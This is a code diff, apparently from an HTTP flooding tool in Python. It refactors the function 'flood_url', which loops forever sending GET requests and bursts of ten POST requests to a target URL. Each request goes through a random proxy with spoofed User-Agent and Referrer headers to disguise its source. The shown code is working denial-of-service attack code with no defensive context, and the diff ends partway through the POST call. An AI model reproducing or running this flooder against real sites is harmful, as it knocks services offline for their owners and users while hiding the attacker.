@@ -1,4 +1,4 @@
-from requests   import get, post
+from requests   import request
 from threading  import Thread
 from random     import choice
 
@@ -8,13 +8,14 @@ from data.spoof import PROXIES,USERAGENTS,REFERRERS
 
     
 
-def flood_url(URL: str) -> None:
+def flood_url(URL: str):
     while True:
         try:
             #turn PROXIES into a list and choose a random one.
             proxy = choice(list(PROXIES))
             #send get request.
-            r = get(
+            r = request(
+                method  = 'GET',
                 url     = URL, 
                 headers = {'User-Agent': choice(USERAGENTS), 'Referrer': choice(REFERRERS)},
                 proxies = {'http': f'http://{proxy}','https': f'http://{proxy}'}
@@ -22,7 +23,8 @@ def flood_url(URL: str) -> None:
             print(f'{C.lime}• {C.white}Request sent, proxy: {C.violet}{proxy}')
             #send post request 10 times.
             for _ in range(10):
-                r = post(
+                r = request(
+                    method  = 'POST',
                     url     = URL, 
                     headers = {'User-Agent': choice(USERAGENTS), 'Referrer': choice(REFERRERS)},
                     proxies = {'http': f'http://{proxy}','https': f'http://{proxy}'}
